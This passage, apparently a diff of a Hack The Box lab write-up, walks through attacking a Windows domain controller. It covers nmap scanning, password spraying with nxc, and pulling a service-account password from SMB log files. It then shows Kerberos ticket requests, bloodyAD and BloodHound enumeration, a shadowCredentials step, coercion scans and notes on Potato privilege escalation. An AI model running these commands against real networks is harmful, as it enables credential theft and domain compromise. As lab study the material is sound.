+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2026</span>-04-20T01:47:52+00:00<span class="p">;</span><span class="w"> </span>+7h07m16s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:
+<span class="p">|</span><span class="w"> </span>Subject<span class="w"> </span>Alternative<span class="w"> </span>Name:<span class="w"> </span>DNS:DC01.logging.htb,<span class="w"> </span>DNS:logging.htb,<span class="w"> </span>DNS:logging
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2026</span>-04-17T03:20:01
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2106</span>-04-17T03:20:01
+<span class="m">5985</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
+Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC01<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb2-time:
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2026</span>-04-20T01:47:44
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>.1.1:
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
+<span class="p">|</span>_clock-skew:<span class="w"> </span>mean:<span class="w"> </span>7h07m16s,<span class="w"> </span>deviation:<span class="w"> </span>0s,<span class="w"> </span>median:<span class="w"> </span>7h07m15s
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">58</span>.97<span class="w"> </span>seconds
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;wallace.everette&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>./tools/usernames.txt
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;We**********&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>./tools/passwords.txt
+</pre></div>
+</div>
+</section>
+<section id="smb-enumeration">
+<h2>SMB Enumeration<a class="headerlink" href="#smb-enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.35.59<span class="w"> </span>-u<span class="w"> </span>./tools/usernames.txt<span class="w"> </span>-p<span class="w"> </span>./tools/passwords.txt<span class="w"> </span>--continue-on-success
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Adding<span class="w"> </span>missing<span class="w"> </span>option<span class="w"> </span><span class="s1">&#39;ignore_opsec&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span>config<span class="w"> </span>section<span class="w"> </span><span class="s1">&#39;nxc&#39;</span><span class="w"> </span>to<span class="w"> </span>nxc.conf
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Creating<span class="w"> </span>missing<span class="w"> </span>folder<span class="w"> </span>protocols
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:logging.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>logging.htb<span class="se">\w</span>allace.everette:We**********
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.35.59<span class="w"> </span>-u<span class="w"> </span>./tools/usernames.txt<span class="w"> </span>-p<span class="w"> </span>./tools/passwords.txt<span class="w"> </span>--shares
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:logging.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>logging.htb<span class="se">\w</span>allace.everette:We**********
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>Logs<span class="w">            </span>READ
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span>WSUSTemp<span class="w">                        </span>A<span class="w"> </span>network<span class="w"> </span>share<span class="w"> </span>used<span class="w"> </span>by<span class="w"> </span>Local<span class="w"> </span>Publishing<span class="w"> </span>from<span class="w"> </span>a<span class="w"> </span>Remote<span class="w"> </span>WSUS<span class="w"> </span>Console<span class="w"> </span>Instance.
+</pre></div>
+</div>
+</section>
+<section id="credential-exposure-in-log-files">
+<h2>Credential Exposure in Log files<a class="headerlink" href="#credential-exposure-in-log-files" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;wallace.everette%We**********&#39;</span><span class="w"> </span>//10.129.35.59/Logs
+lpcfg_do_global_parameter:<span class="w"> </span>WARNING:<span class="w"> </span>The<span class="w"> </span><span class="s2">&quot;client lanman auth&quot;</span><span class="w"> </span>option<span class="w"> </span>is<span class="w"> </span>deprecated
+Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
+smb:<span class="w"> </span><span class="se">\&gt;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+<span class="w">  </span>Audit_Heartbeat.log<span class="w">                 </span>A<span class="w">     </span><span class="m">1294</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+<span class="w">  </span>IdentitySync_Trace_20260219.log<span class="w">      </span>A<span class="w">     </span><span class="m">8488</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+<span class="w">  </span>Service_State.log<span class="w">                   </span>A<span class="w">      </span><span class="m">468</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+<span class="w">  </span>TaskMonitor.log<span class="w">                     </span>A<span class="w">     </span><span class="m">1170</span><span class="w">  </span>Fri<span class="w"> </span>Apr<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">00</span>:10:09<span class="w"> </span><span class="m">2026</span>
+
+<span class="w">  </span><span class="m">6657279</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1034926</span><span class="w"> </span>blocks<span class="w"> </span>available
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mget<span class="w"> </span>*
+Get<span class="w"> </span>file<span class="w"> </span>Audit_Heartbeat.log?<span class="w"> </span>y
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\A</span>udit_Heartbeat.log<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">1294</span><span class="w"> </span>as<span class="w"> </span>Audit_Heartbeat.log<span class="w"> </span><span class="o">(</span><span class="m">4</span>.1<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">4</span>.1<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+Get<span class="w"> </span>file<span class="w"> </span>IdentitySync_Trace_20260219.log?<span class="w"> </span>y
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\I</span>dentitySync_Trace_20260219.log<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">8488</span><span class="w"> </span>as<span class="w"> </span>IdentitySync_Trace_20260219.log<span class="w"> </span><span class="o">(</span><span class="m">30</span>.9<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">16</span>.6<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+Get<span class="w"> </span>file<span class="w"> </span>Service_State.log?<span class="w"> </span>y
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\S</span>ervice_State.log<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">468</span><span class="w"> </span>as<span class="w"> </span>Service_State.log<span class="w"> </span><span class="o">(</span><span class="m">2</span>.3<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">13</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+Get<span class="w"> </span>file<span class="w"> </span>TaskMonitor.log?<span class="w"> </span>y
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\T</span>askMonitor.log<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">1170</span><span class="w"> </span>as<span class="w"> </span>TaskMonitor.log<span class="w"> </span><span class="o">(</span><span class="m">5</span>.6<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">11</span>.4<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>file<span class="w"> </span>./*
+./Audit_Heartbeat.log:<span class="w">             </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators
+./IdentitySync_Trace_20260219.log:<span class="w"> </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators
+./Service_State.log:<span class="w">               </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators
+./TaskMonitor.log:<span class="w">                 </span>ASCII<span class="w"> </span>text,<span class="w"> </span>with<span class="w"> </span>CRLF<span class="w"> </span>line<span class="w"> </span>terminators
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gitleaks<span class="w"> </span>detect<span class="w"> </span>--no-git<span class="w"> </span>./*
+
+<span class="w">    </span>○
+<span class="w">    </span>│╲
+<span class="w">    </span>│<span class="w"> </span>○
+<span class="w">    </span>○<span class="w"> </span>░
+<span class="w">    </span>░<span class="w">    </span>gitleaks
+
+<span class="m">8</span>:02PM<span class="w"> </span>INF<span class="w"> </span>scanned<span class="w"> </span>~11420<span class="w"> </span>bytes<span class="w"> </span><span class="o">(</span><span class="m">11</span>.42<span class="w"> </span>KB<span class="o">)</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">40</span>.3ms
+<span class="m">8</span>:02PM<span class="w"> </span>INF<span class="w"> </span>no<span class="w"> </span>leaks<span class="w"> </span>found
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>./*
+./IdentitySync_Trace_20260219.log:<span class="o">[</span><span class="m">2026</span>-02-09<span class="w"> </span><span class="m">03</span>:00:03.125<span class="o">]</span><span class="w"> </span><span class="o">[</span>PID:4102<span class="o">]</span><span class="w"> </span><span class="o">[</span>Thread:04<span class="o">]</span><span class="w"> </span>VERBOSE<span class="w"> </span>-<span class="w"> </span>ConnectionContext<span class="w"> </span>Dump:<span class="w"> </span><span class="o">{</span><span class="w"> </span>Domain:<span class="w"> </span><span class="s2">&quot;logging.htb&quot;</span>,<span class="w"> </span>Server:<span class="w"> </span><span class="s2">&quot;DC01&quot;</span>,<span class="w"> </span>SSL:<span class="w"> </span><span class="s2">&quot;False&quot;</span>,<span class="w"> </span>BindUser:<span class="w"> </span><span class="s2">&quot;LOGGING\svc_recovery&quot;</span>,<span class="w"> </span>BindPass:<span class="w"> </span><span class="s2">&quot;Em3***************, Timeout: 30 }</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;LOGGING\svc_recovery&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>./tools/usernames.txt
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;Em***************&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>./tools/passwords.txt
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>ntpdate<span class="w"> </span>logging
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py &#39;LOGGING/svc_recovery:Em3***************
+zsh: /home/blnkn/.local/bin/getTGT.py: bad interpreter: /home/blnkn/.local/pipx/venvs/impacket/bin/python: no such file or directory
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in svc_recovery.ccache
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>echo &#39;Em3*************** &gt;&gt; ./tools/passwords.txt
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>~/sec/htb/machines/logging/tools/svc_recovery.ccache
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>klist
+Ticket<span class="w"> </span>cache:<span class="w"> </span>FILE:/home/blnkn/sec/htb/machines/logging/tools/svc_recovery.ccache
+Default<span class="w"> </span>principal:<span class="w"> </span>svc_recovery@LOGGING.HTB
+
+Valid<span class="w"> </span>starting<span class="w">       </span>Expires<span class="w">              </span>Service<span class="w"> </span>principal
+<span class="m">04</span>/20/2026<span class="w"> </span><span class="m">03</span>:25:11<span class="w">  </span><span class="m">04</span>/20/2026<span class="w"> </span><span class="m">07</span>:25:11<span class="w">  </span>krbtgt/LOGGING@LOGGING.HTB
+<span class="w"> </span>renew<span class="w"> </span><span class="k">until</span><span class="w"> </span><span class="m">04</span>/20/2026<span class="w"> </span><span class="m">07</span>:25:11
+</pre></div>
+</div>
+</section>
+<section id="ldap-enumeration">
+<h2>LDAP Enumeration<a class="headerlink" href="#ldap-enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.129.35.59<span class="w"> </span>-u<span class="w"> </span>./tools/usernames.txt<span class="w"> </span>-p<span class="w"> </span>./tools/passwords.txt<span class="w"> </span>--continue-on-success
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Initializing<span class="w"> </span>LDAP<span class="w"> </span>protocol<span class="w"> </span>database
+SMB<span class="w">         </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:logging.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP<span class="w">        </span><span class="m">10</span>.129.35.59<span class="w">    </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>logging.htb<span class="se">\w</span>allace.everette:We**********
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>INFO<span class="w">  </span>-<span class="w"> </span>Establishing<span class="w"> </span>SQL<span class="w"> </span>session<span class="w"> </span>with<span class="w"> </span>HR01.logging.htb...
+TRACE<span class="w"> </span>-<span class="w"> </span>Querying<span class="w"> </span><span class="o">[</span>loggingHR<span class="o">]</span>.<span class="o">[</span>dbo<span class="o">]</span>.<span class="o">[</span>Employees<span class="o">]</span><span class="w"> </span>where<span class="w"> </span><span class="nv">SyncStatus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>
+</pre></div>
+</div>
+<p>Note to self, you’re better off always using the official extraction tools, you lost a lot of time here with incomplete information</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nxc ldap 10.129.35.59 -d logging.htb --dns-server 10.129.35.59 -u svc_recovery -p &#39;Em3*************** -k --bloodhound
+SMB         10.129.35.59    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.35.59    389    DC01             [+] logging.htb\svc_recovery:Em3**************
+LDAP        10.129.35.59    389    DC01             Resolved collection methods: localadmin, session, group, trusts
+LDAP        10.129.35.59    389    DC01             Using kerberos auth without ccache, getting TGT
+LDAP        10.129.35.59    389    DC01             Done in 00M 08S
+LDAP        10.129.35.59    389    DC01             Compressing output into /home/blnkn/.nxc/logs/DC01_10.129.35.59_2026-04-20_042923_bloodhound.zip
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>(venv) [blnkn@arch](main =):/opt/bloodyAD% bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get dnsDump | grep -v recordName | sort -u
+
+A: 10.129.35.59
+CNAME: dc01.logging.htb
+NS: dc01.logging.htb
+SOA.PrimaryServer: dc01.logging.htb
+SOA.zoneAdminEmail: hostmaster@logging.htb
+SRV: dc01.logging.htb:3268
+SRV: dc01.logging.htb:389
+SRV: dc01.logging.htb:464
+SRV: dc01.logging.htb:88
+zoneName: logging.htb
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>-i<span class="w"> </span><span class="m">3268</span><span class="w"> </span>/etc/services
+msft-gc<span class="w">          </span><span class="m">3268</span>/tcp
+msft-gc<span class="w">          </span><span class="m">3268</span>/udp
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nc<span class="w"> </span>-vz<span class="w"> </span>logging<span class="w"> </span><span class="m">3268</span>
+Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.98<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org/ncat<span class="w"> </span><span class="o">)</span>
+Ncat:<span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">10</span>.129.35.59:3268.
+Ncat:<span class="w"> </span><span class="m">0</span><span class="w"> </span>bytes<span class="w"> </span>sent,<span class="w"> </span><span class="m">0</span><span class="w"> </span>bytes<span class="w"> </span>received<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.06<span class="w"> </span>seconds.
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get search \
+    --filter &quot;(primaryGroupID=516)&quot;\
+    --attr sAMAccountName
+
+distinguishedName: CN=DC01,OU=Domain Controllers,DC=logging,DC=htb
+sAMAccountName: DC01$
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get search \
+    --filter &quot;(primaryGroupID=515)&quot; \
+    --attr sAMAccountName
+
+distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
+sAMAccountName: msa_health$
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get search \
+    --filter &quot;(primaryGroupID=513)&quot;\
+    --attr sAMAccountName | grep sAMA
+sAMAccountName: Administrator
+sAMAccountName: krbtgt
+sAMAccountName: svc_recovery
+sAMAccountName: jaylee.clifton
+sAMAccountName: monique.chip
+sAMAccountName: kyson.abel
+sAMAccountName: fable.milford
+sAMAccountName: wellington.kylan
+sAMAccountName: serina.philander
+sAMAccountName: wallace.everette
+sAMAccountName: toby.brynleigh
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  get object svc_recovery --attr allowedChildClasses
+distinguishedName: CN=svc_recovery,CN=Users,DC=logging,DC=htb
+allowedChildClasses: ms-net-ieee-80211-GroupPolicy; nTFRSSubscriptions; classStore; ms-net-ieee-8023-GroupPolicy
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD -k \
+  -u &#39;svc_recovery&#39; \
+  -p &#39;Em3*************** \
+  --dc-ip 10.129.35.59 \
+  --host DC01.logging.htb \
+  -d &quot;logging.htb&quot; \
+  shadowCredentials svc_recovery
+</pre></div>
+</div>
+</section>
+<section id="learning-about-dcom">
+<h2>Learning About DCOM<a class="headerlink" href="#learning-about-dcom" title="Permalink to this heading">#</a></h2>
+<ol class="arabic simple">
+<li><p>Remote DCOM Activation Rights
+By default, members of the Performance Log Users group have the right to remotely
+activate certain DCOM objects. As we discussed with SilverPotato, the exploit relies
+on triggering a DCOM call to a specific Service (like CertSrv for AD CS). If an attacker
+can compromise a user who is part of this group, they have a “legal” way to talk to the
+DCOM components needed to start the exploit.</p></li>
+<li><p>The “Scheduler” and “Task” Triggers
+Many “Potato” exploits (like JuicyPotatoNG or PrintPotato) rely on triggering a system
+service to authenticate against a fake listener. Performance Log Users have the
+permissions to start/stop certain performance counters and diagnostic logs. These
+actions often trigger high-privileged services (running as SYSTEM or NetworkService)
+to perform checks, which the attacker then intercepts.</p></li>
+<li><p>Bypassing Restrictions
+In highly hardened environments, “Domain Users” might be blocked from remote RPC calls.
+However, administrators often forget to strip these rights from Performance Log Users
+because it’s a built-in Windows group used for monitoring tools. This makes it a
+“blind spot” for defenders and a “green light” for SilverPotato.</p></li>
+</ol>
+</section>
+<section id="learning-about-potatoes">
+<h2>Learning About Potatoes<a class="headerlink" href="#learning-about-potatoes" title="Permalink to this heading">#</a></h2>
+<div class="highlight-txt notranslate"><div class="highlight"><pre><span></span>RottenPotato    BITS Service          The original proof of concept using the BITS service.
+JuicyPotato     DCOM / CLSIDs         Expanded the attack to use hundreds of different Windows &quot;objects&quot; to trigger the auth.
+PrintPotato     Print Spooler         Leveraged the Windows Print Spooler service to coerce authentication.
+RoguePotato     Fake OXID Resolver    Created after Microsoft patched the way DCOM handled local resolvers.
+SilverPotato    AD CS / DCOM          The variant we discussed earlier, specifically targeting Certificate Services.
+</pre></div>
+</div>
+<ul class="simple">
+<li><p><a class="reference external" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">jlajara - potatoes</a></p></li>
+<li><p><a class="reference external" href="https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all">hideansec - potatoes</a></p></li>
+<li><p>ADCSCoercePotato</p></li>
+<li><p>DISTRIBUTED COM <a class="reference external" href="mailto:USERS&#37;&#52;&#48;LOGGING&#46;HTB">USERS<span>&#64;</span>LOGGING<span>&#46;</span>HTB</a></p></li>
+<li><p>PERFORMANCE LOG <a class="reference external" href="mailto:USERS&#37;&#52;&#48;LOGGING&#46;HTB">USERS<span>&#64;</span>LOGGING<span>&#46;</span>HTB</a></p></li>
+</ul>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>coercer scan -u &#39;svc_recovery&#39; -p &#39;Em3*************** --target 10.129.35.59
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python bloodhound.py \
+  -ns 10.129.35.59 \
+  -dc dc01.logging.htb \
+  -d logging.htb \
+  -u svc_recovery \
+  -p &#39;Em3*************** \
+  -no-pass \
+  --zip \
+  -c All \
+  -k
+</pre></div>
+</div>
